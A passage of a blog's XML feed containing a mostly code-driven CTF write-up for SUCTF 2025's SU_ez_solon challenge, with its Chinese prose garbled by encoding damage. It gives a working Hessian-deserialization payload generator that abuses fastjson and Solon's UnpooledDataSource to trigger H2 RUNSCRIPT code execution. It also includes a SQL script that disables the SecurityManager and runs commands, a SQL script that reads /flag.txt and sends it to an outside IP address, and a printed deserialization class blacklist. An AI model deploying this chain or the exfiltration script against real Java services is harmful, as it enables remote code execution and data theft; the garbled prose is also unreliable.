href="https://github.com/vulhub/vulhub/blob/master/hugegraph/CVE-2024-43441/README.zh-cn.md">vulhub&#x2F;hugegraph&#x2F;CVE-2024-43441&#x2F;README.zh-cn.md at master Â· vulhub&#x2F;vulhub</a></p><p><a href="https://avd.aliyun.com/detail?id=AVD-2024-43441&timestamp__1384=eqIxnDB7i=84lxGg=DyiDgj05GQZhPDkAeD">é˜¿é‡Œäº‘æ¼æ´åº“</a></p><p><a href="https://hugegraph.incubator.apache.org/cn/docs/config/config-authentication/">HugeGraph å†…ç½®ç”¨æˆ·æƒé™ä¸æ‰©å±•æƒé™é…ç½®åŠä½¿ç”¨ | HugeGraph</a></p>]]></content>
      
      
      <categories>
          
          <category> ä»£ç å®¡è®¡ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>2025-SUCTF-SU-ez-solon</title>
      <link href="/2025/02/2025-SUCTF-SU-ez-solon/"/>
      <url>/2025/02/2025-SUCTF-SU-ez-solon/</url>
      
        <content type="html"><![CDATA[<h2 id="SU-ez-solon"><a href="#SU-ez-solon" class="headerlink" title="SU_ez_solon"></a>SU_ez_solon</h2><blockquote><p>solonæ¡†æ¶è§¦å‘getteræ–°é“¾ï¼Œç»“åˆh2 rce</p></blockquote><p>è°ƒè¯•æˆ‘è¿™é‡Œæ˜¯ç”¨cfrè¿›è¡Œçš„åç¼–è¯‘ï¼ˆæœ‰æ—¶å€™åˆä¸å¤ªè¡Œï¼‰ï¼Œç„¶åå¯åŠ¨é¡¹ç›®è¿›è¡Œçš„è°ƒè¯•ï¼Œç”¨ä¸Šé¢æ–¹æ³•ä¼¼ä¹åªèƒ½è°ƒé‚£ä¸ªæ¡†æ¶</p><p>å‰ä¸ä¹…ccbä¹Ÿé‡åˆ°è¿‡è¿™ä¸ªæ¡†æ¶çš„Javaé¢˜ï¼Œä¸è¿‡é‚£ä¸ªæ˜¯åˆ©ç”¨Linux jdkä¸­çš„ç±»ä½œä¸ºsinkç‚¹ï¼Œæ‡’å¾—æ­ç¯å¢ƒçœ‹äº†ä¸‹wpæ²¡å¤ç°</p><p>è¿™ä¸ªé¢˜æ˜¯ç›´æ¥ç»™äº†hessianååºåˆ—åŒ–ï¼Œç„¶åè°ƒç”¨äº†toStringæ–¹æ³•</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">IndexController</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">IndexController</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Mapping(&quot;/hello&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">hello</span><span class="params">(<span class="meta">@Param(defaultValue = &quot;hello&quot;)</span> String data)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] decode = Base64.getDecoder().decode(data);</span><br><span class="line">        <span class="type">Hessian2Input</span> <span class="variable">hessian2Input</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hessian2Input</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(decode));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">object</span> <span class="operator">=</span> hessian2Input.readObject();</span><br><span class="line">        <span class="keyword">return</span> object.toString();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>çœ‹çœ‹ä¾èµ–å­˜åœ¨fastjson1.2.83é‚£ä¹ˆå°±æ˜¯åˆ©ç”¨è¿™ä¸ªè°ƒgetterç„¶årce</p><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/image%202-1740244082327.png" alt="image.png"></p><p>ä½†æ˜¯sofa-hessianè‡ªå¸¦çš„æœ‰åºåˆ—åŒ–é»‘åå•ï¼Œå¯ä»¥è°ƒä¸€ä¸‹çœ‹çœ‹åºåˆ—åŒ–è¿‡ç¨‹ï¼Œå¼„äº†ä¸€ä¸ªæœ‰é»‘åå•ä¸­ç±»çš„pocæ¥è°ƒè¯•</p><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/image-20250223011903921.png" alt="image-20250223011903921"></p><p>å¯ä»¥çœ‹åˆ°ï¼Œåºåˆ—åŒ–çš„æ—¶å€™å°±ç›´æ¥å¤±è´¥äº†ï¼Œå¯ä»¥ç›´æ¥æŠ¥é”™çš„åœ°æ–¹ä¸‹ä¸ªæ–­ç‚¹ï¼Œè¿™æ ·å°±èƒ½çœ‹åˆ°è°ƒç”¨æ ˆäº†ï¼Œç„¶åä¸€æ­¥æ­¥è·Ÿå³å¯</p><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/image-20250223011933598.png" alt="image-20250223011933598"></p><p>è·Ÿè¿›<code>getSerializer</code> </p><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/image%205-1740244082327.png" alt="image.png"></p><p>ç„¶åè¿›å…¥åˆ°ä¸€å¼€å§‹çš„æ–­ç‚¹<code>resolve</code> æ–¹æ³•ä¸­</p><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/image-20250223011134672.png" alt="image-20250223011134672"></p><p>ç„¶åå°±æ˜¯å¯¹äºè¦åºåˆ—åŒ–çš„ç±»ä¸€ä¸ªä¸ªæ£€æµ‹</p><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/image%207-1740244082327.png" alt="image.png"></p><p>æœ€ç»ˆæŠ›å‡º<code>TemplatesImpl</code> åœ¨é»‘åå•</p><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/image-20250223011227579.png" alt="image-20250223011227579"></p><p>æ•´ä¸ªé»‘åå•æŒºå¤šçš„</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br></pre></td><td class="code"><pre><span class="line">aj.org.objectweb.asm.</span><br><span class="line">br.com.anteros.</span><br><span class="line">bsh.</span><br><span class="line">ch.qos.logback.</span><br><span class="line">clojure.</span><br><span class="line">com.alibaba.citrus.springext.support.parser.</span><br><span class="line">com.alibaba.citrus.springext.util.SpringExtUtil.</span><br><span class="line">com.alibaba.druid.pool.</span><br><span class="line">com.alibaba.druid.stat.JdbcDataSourceStat</span><br><span class="line">com.alibaba.fastjson.annotation.</span><br><span class="line">com.alibaba.hotcode.internal.org.apache.commons.collections.functors.</span><br><span class="line">com.alipay.custrelation.service.model.redress.</span><br><span class="line">com.alipay.oceanbase.obproxy.druid.pool.</span><br><span class="line">com.caucho.hessian.test.TestCons</span><br><span class="line">com.caucho.naming.Qname</span><br><span class="line">com.ibatis.</span><br><span class="line">com.ibm.jtc.jax.xml.bind.v2.runtime.unmarshaller.</span><br><span class="line">com.ibm.xltxe.rnm1.xtq.bcel.util.</span><br><span class="line">com.mchange.</span><br><span class="line">com.mysql.cj.jdbc.admin.</span><br><span class="line">com.mysql.cj.jdbc.MysqlConnectionPoolDataSource</span><br><span class="line">com.mysql.cj.jdbc.MysqlDataSource</span><br><span class="line">com.mysql.cj.jdbc.MysqlXADataSource</span><br><span class="line">com.mysql.cj.log.</span><br><span class="line">com.mysql.jdbc.util.</span><br><span class="line">com.p6spy.engine.</span><br><span class="line">com.rometools.rome.feed.</span><br><span class="line">com.sun.</span><br><span class="line">com.taobao.eagleeye.wrapper.</span><br><span class="line">com.taobao.vipserver.commons.collections.functors.</span><br><span class="line">com.zaxxer.hikari.</span><br><span class="line">flex.messaging.util.concurrent.</span><br><span class="line">groovy.lang.</span><br><span class="line">java.awt.</span><br><span class="line">java.beans.</span><br><span class="line">java.net.InetAddress</span><br><span class="line">java.net.Socket</span><br><span class="line">java.net.URL</span><br><span class="line">java.rmi.</span><br><span class="line">java.security.</span><br><span class="line">java.util.EventListener</span><br><span class="line">java.util.jar.</span><br><span class="line">java.util.logging.</span><br><span class="line">java.util.prefs.</span><br><span class="line">java.util.ServiceLoader</span><br><span class="line">java.util.StringTokenizer</span><br><span class="line">javassist.</span><br><span class="line">javax.activation.</span><br><span class="line">javax.imageio.</span><br><span class="line">javax.management.</span><br><span class="line">javax.media.jai.remote.</span><br><span class="line">javax.naming.</span><br><span class="line">javax.net.</span><br><span class="line">javax.print.</span><br><span class="line">javax.script.</span><br><span class="line">javax.sound.</span><br><span class="line">javax.swing.</span><br><span class="line">javax.tools.</span><br><span class="line">javax.xml</span><br><span class="line">jdk.internal.</span><br><span class="line">jodd.db.connection.</span><br><span class="line">junit.</span><br><span class="line">net.bytebuddy.dynamic.loading.</span><br><span class="line">net.sf.cglib.</span><br><span class="line">net.sf.ehcache.hibernate.</span><br><span class="line">net.sf.ehcache.transaction.manager.</span><br><span class="line">ognl.</span><br><span class="line">oracle.jdbc.</span><br><span class="line">oracle.jms.aq.</span><br><span class="line">oracle.net.</span><br><span class="line">org.aoju.bus.proxy.provider.</span><br><span class="line">org.apache.activemq.ActiveMQConnectionFactory</span><br><span class="line">org.apache.activemq.ActiveMQXAConnectionFactory</span><br><span class="line">org.apache.activemq.jms.pool.</span><br><span class="line">org.apache.activemq.pool.</span><br><span class="line">org.apache.activemq.spring.</span><br><span class="line">org.apache.aries.transaction.</span><br><span class="line">org.apache.axis2.jaxws.spi.handler.</span><br><span class="line">org.apache.axis2.transport.jms.</span><br><span class="line">org.apache.bcel.</span><br><span class="line">org.apache.carbondata.core.scan.expression.</span><br><span class="line">org.apache.catalina.</span><br><span class="line">org.apache.cocoon.</span><br><span class="line">org.apache.commons.beanutils.</span><br><span class="line">org.apache.commons.codec.</span><br><span class="line">org.apache.commons.collections.comparators.</span><br><span class="line">org.apache.commons.collections.functors.</span><br><span class="line">org.apache.commons.collections.Transformer</span><br><span class="line">org.apache.commons.collections4.comparators.</span><br><span class="line">org.apache.commons.collections4.functors.</span><br><span class="line">org.apache.commons.collections4.Transformer</span><br><span class="line">org.apache.commons.configuration.</span><br><span class="line">org.apache.commons.configuration2.</span><br><span class="line">org.apache.commons.dbcp.</span><br><span class="line">org.apache.commons.fileupload.</span><br><span class="line">org.apache.commons.jelly.</span><br><span class="line">org.apache.commons.logging.</span><br><span class="line">org.apache.commons.proxy.</span><br><span class="line">org.apache.cxf.jaxrs.provider.</span><br><span class="line">org.apache.hadoop.shaded.com.zaxxer.hikari.</span><br><span class="line">org.apache.http.auth.</span><br><span class="line">org.apache.http.conn.</span><br><span class="line">org.apache.http.cookie.</span><br><span class="line">org.apache.http.impl.</span><br><span class="line">org.apache.ibatis.datasource.</span><br><span class="line">org.apache.ibatis.executor.</span><br><span class="line">org.apache.ibatis.javassist.</span><br><span class="line">org.apache.ibatis.ognl.</span><br><span class="line">org.apache.ibatis.parsing.</span><br><span class="line">org.apache.ibatis.reflection.</span><br><span class="line">org.apache.ibatis.scripting.</span><br><span class="line">org.apache.ignite.cache.</span><br><span class="line">org.apache.ignite.cache.jta.</span><br><span class="line">org.apache.log.output.db.</span><br><span class="line">org.apache.log4j.</span><br><span class="line">org.apache.logging.</span><br><span class="line">org.apache.myfaces.context.servlet.</span><br><span class="line">org.apache.myfaces.view.facelets.el.</span><br><span class="line">org.apache.openjpa.ee.</span><br><span class="line">org.apache.shiro.</span><br><span class="line">org.apache.tomcat.</span><br><span class="line">org.apache.velocity.</span><br><span class="line">org.apache.wicket.util.</span><br><span class="line">org.apache.xalan.</span><br><span class="line">org.apache.xbean.</span><br><span class="line">org.apache.xpath.</span><br><span class="line">org.apache.zookeeper.</span><br><span class="line">org.aspectj.</span><br><span class="line">org.codehaus.groovy.runtime.</span><br><span class="line">org.codehaus.jackson.</span><br><span class="line">org.datanucleus.store.rdbms.datasource.dbcp.datasources.</span><br><span class="line">org.dom4j.</span><br><span class="line">org.eclipse.jetty.</span><br><span class="line">org.geotools.filter.</span><br><span class="line">org.h2.jdbcx.</span><br><span class="line">org.h2.server.</span><br><span class="line">org.h2.value.</span><br><span class="line">org.hibernate.</span><br><span class="line">org.javasimon.</span><br><span class="line">org.jaxen.</span><br><span class="line">org.jboss.</span><br><span class="line">org.jdom.</span><br><span class="line">org.jdom2.transform.</span><br><span class="line">org.junit.</span><br><span class="line">org.logicalcobwebs.</span><br><span class="line">org.mockito.</span><br><span class="line">org.mortbay.jetty.</span><br><span class="line">org.mortbay.log.</span><br><span class="line">org.mozilla.javascript.</span><br><span class="line">org.objectweb.asm.</span><br><span class="line">org.osjava.sj.</span><br><span class="line">org.python.core.</span><br><span class="line">org.quartz.</span><br><span class="line">org.slf4j.</span><br><span class="line">org.springframework.aop.aspectj.autoproxy.AspectJAwareAdvisorAutoProxyCreator$PartiallyComparableAdvisorHolder</span><br><span class="line">org.springframework.aop.support.DefaultBeanFactoryPointcutAdvisor</span><br><span class="line">org.springframework.beans.factory.BeanFactory</span><br><span class="line">org.springframework.beans.factory.config.PropertyPathFactoryBean</span><br><span class="line">org.springframework.beans.factory.support.DefaultListableBeanFactory</span><br><span class="line">org.springframework.jndi.support.SimpleJndiBeanFactory</span><br><span class="line">org.springframework.orm.jpa.AbstractEntityManagerFactoryBean</span><br><span class="line">org.springframework.transaction.jta.JtaTransactionManager</span><br><span class="line">org.springframework.jndi.JndiObjectTargetSource</span><br><span class="line">org.springframework.beans.factory.config.MethodInvokingFactoryBean</span><br><span class="line">org.thymeleaf.</span><br><span class="line">org.yaml.snakeyaml.tokens.</span><br><span class="line">pstore.shaded.org.apache.commons.collections.</span><br><span class="line">sun.print.</span><br><span class="line">sun.rmi.server.</span><br><span class="line">sun.rmi.transport.</span><br><span class="line">weblogic.ejb20.internal.</span><br><span class="line">weblogic.jms.common.</span><br></pre></td></tr></table></figure><p>åŸºæœ¬ä¸Šéƒ½åœ¨è¿™é‡Œé¢äº†ï¼Œæ‰€ä»¥ç°åœ¨å°±éœ€è¦æ‰¾ä¸€æ¡èƒ½å¤Ÿè§¦å‘<code>DriverManager.getConnection</code> çš„ç±»ï¼Œç”¨æ¥æ‰“h2 rceï¼Œè¿™é‡Œåˆ©ç”¨tabbyï¼Œå€Ÿç”¨bmthå¸ˆå‚…çš„è§„åˆ™</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">match path=(m1:Method)-[:CALL*.<span class="number">.10</span>]-&gt;(m2:Method &#123;IS_SINK:<span class="literal">true</span>&#125;) where m1.NAME =~ <span class="string">&quot;get.*&quot;</span> and m1.PARAMETER_SIZE=<span class="number">0</span> and m2.VUL=<span class="string">&quot;JNDI&quot;</span></span><br><span class="line"><span class="keyword">return</span> path limit <span class="number">10</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/image-20250223011454984.png" alt="image-20250223011454984"></p><p>æˆåŠŸæ‰¾åˆ°<code>UnpooledDataSource</code> ç±»</p><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/image-20250223011559101.png" alt="image-20250223011559101"></p><p>payloadå¦‚ä¸‹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSONObject;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.Hessian2Output;</span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.SerializerFactory;</span><br><span class="line"><span class="keyword">import</span> org.noear.solon.data.util.UnpooledDataSource;</span><br><span class="line"><span class="keyword">import</span> sun.reflect.ReflectionFactory;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="comment">//è·å–ReflectionFactoryå¯¹è±¡ï¼Œå®ƒæœ¬èº«æ˜¯å•ä¾‹çš„</span></span><br><span class="line">        <span class="type">ReflectionFactory</span> <span class="variable">reflectionFactory</span> <span class="operator">=</span> ReflectionFactory.getReflectionFactory();</span><br><span class="line">        <span class="comment">//è·å–Objectç±»çš„æ„é€ å™¨</span></span><br><span class="line">        Constructor&lt;Object&gt; constructor = Object.class.getDeclaredConstructor();</span><br><span class="line">        <span class="comment">//æ ¹æ®Objectæ„é€ å™¨åˆ›å»ºä¸€ä¸ªUserç±»çš„æ„é€ å™¨</span></span><br><span class="line">        Constructor&lt;?&gt; constructorForSerialization = reflectionFactory</span><br><span class="line">                .newConstructorForSerialization(UnpooledDataSource.class, constructor);</span><br><span class="line">        constructorForSerialization.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="comment">//å®ä¾‹åŒ–å¯¹è±¡</span></span><br><span class="line">        <span class="type">UnpooledDataSource</span> <span class="variable">unpooledDataSource</span> <span class="operator">=</span> (UnpooledDataSource) constructorForSerialization.newInstance();</span><br><span class="line"></span><br><span class="line">        unpooledDataSource.setUrl(<span class="string">&quot;jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM &#x27;http://127.0.0.1:8888/poc.sql&#x27;&quot;</span>);</span><br><span class="line">        <span class="type">JSONObject</span> <span class="variable">jsonObject</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JSONObject</span>();</span><br><span class="line">        jsonObject.put(<span class="string">&quot;ds&quot;</span>, unpooledDataSource);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">Hessian2Output</span> <span class="variable">hessianOutput</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hessian2Output</span>(byteArrayOutputStream);</span><br><span class="line">        hessianOutput.setSerializerFactory(<span class="keyword">new</span> <span class="title class_">SerializerFactory</span>());</span><br><span class="line">        hessianOutput.getSerializerFactory().setAllowNonSerializable(<span class="literal">true</span>);</span><br><span class="line">        hessianOutput.writeObject(jsonObject);</span><br><span class="line">        hessianOutput.flush();</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] data = byteArrayOutputStream.toByteArray();</span><br><span class="line">        Base64.<span class="type">Encoder</span> <span class="variable">encoder</span> <span class="operator">=</span> Base64.getEncoder();</span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> encoder.encodeToString(data);</span><br><span class="line">        System.out.println(payload);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ç„¶åé¢˜ç›®ä¸­è¿˜æœ‰ä¸€ä¸ªsecurityManageréœ€è¦ç»•è¿‡</p><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/image-20250223011625246.png" alt="image-20250223011625246"></p><p>é‚£ä¹ˆåœ¨å‘½ä»¤æ‰§è¡Œå‰å°†å…¶è®¾ç½®ä¸ºnullå³å¯ï¼Œpoc.sqlå¦‚ä¸‹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CREATE ALIAS EXEC AS <span class="string">&#x27;String shellexec(String cmd) throws java.io.IOException &#123;System.setSecurityManager(null);Runtime.getRuntime().exec(cmd);return &quot;su18&quot;;&#125;&#x27;</span>;CALL <span class="title function_">EXEC</span> <span class="params">(<span class="string">&#x27;calc&#x27;</span>)</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/image-20250223011641411.png" alt="image-20250223011641411"></p><p>è¯»å–æ–‡ä»¶çš„poc.sql</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">CREATE ALIAS EXECf AS <span class="string">&#x27;String shellexec(String cmd) throws java.io.IOException &#123;String str = &quot;&quot;;java.io.File file = new java.io.File(&quot;/flag.txt&quot;);try (java.io.BufferedReader reader = new java.io.BufferedReader(new java.io.FileReader(file))) &#123;String line;while ((line = reader.readLine()) != null) &#123;    str += line;&#125;&#125; catch (java.io.IOException e) &#123;e.printStackTrace();&#125; java.net.URL url = new java.net.URL(&quot;http://8.134.216.221:1234/test?str=&quot;+str);java.net.HttpURLConnection connection = (java.net.HttpURLConnection) url.openConnection();connection.setRequestMethod(&quot;GET&quot;);connection.setRequestProperty(&quot;User-Agent&quot;, &quot;Java HTTP Client&quot;);int responseCode = connection.getResponseCode(); return &quot;&quot;;&#125;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">CALL <span class="title function_">EXECf</span> <span class="params">(<span class="string">&#x27;114514&#x27;</span>)</span></span><br></pre></td></tr></table></figure><p>åˆ©ç”¨é“¾</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">com.alibaba.fastjson.JSONObject.toString</span><br><span class="line"> =&gt;org.noear.solon.data.util.UnpooledDataSource.getConnection</span><br><span class="line"> =&gt;java.sql.DriverManager.getConnection</span><br><span class="line"> =&gt;RCE</span><br></pre></td></tr></table></figure><p>æœ‰äº›ç‚¹æ²¡ç»†è·Ÿï¼Œåé¢é‡åˆ°äº†å†è¯´ï¼Œä¸»è¦å­¦ä¸€ä¸‹hessianååºåˆ—åŒ–ï¼Œå¤ç°é‡åˆ°ä¸€å †å¥‡å¥‡æ€ªæ€ªçš„é—®é¢˜ï¼Œéš¾ç»·ï¼Œä¸€åº¦ä¸æƒ³çœ‹äº†ã€‚ã€‚ã€‚ã€‚</p><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><p><a href="http://www.bmth666.cn/2025/02/11/2025-SUCTF-java%E9%A2%98%E5%A4%8D%E7%8E%B0/">2025 SUCTF javaé¢˜å¤ç° | Bmthâ€™s blog</a></p><p><a href="https://www.yulate.com/post/suctf2025-chu-ti-ji-lu/">SUCTF2025 å‡ºé¢˜è®°å½• - yulateâ€™s blog</a></p><p><a href="https://err0r233.github.io/posts/25622.html">SUCTF2025 Webæ–¹å‘éƒ¨åˆ†æ€è·¯ | Err0r233</a></p><p><a href="https://blog.potatowo.top/2025/01/15/SUCTF2025">https://blog.potatowo.top/2025/01/15/SUCTF2025</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>PolarCTF_2024ç§‹å­£ä¸ªäººæŒ‘æˆ˜èµ›_Java</title>
      <link href="/2024/11/PolarCTF-2024%E7%A7%8B%E5%AD%A3%E4%B8%AA%E4%BA%BA%E6%8C%91%E6%88%98%E8%B5%9B-Java/"/>
      <url>/2024/11/PolarCTF-2024%E7%A7%8B%E5%AD%A3%E4%B8%AA%E4%BA%BA%E6%8C%91%E6%88%98%E8%B5%9B-Java/</url>
      
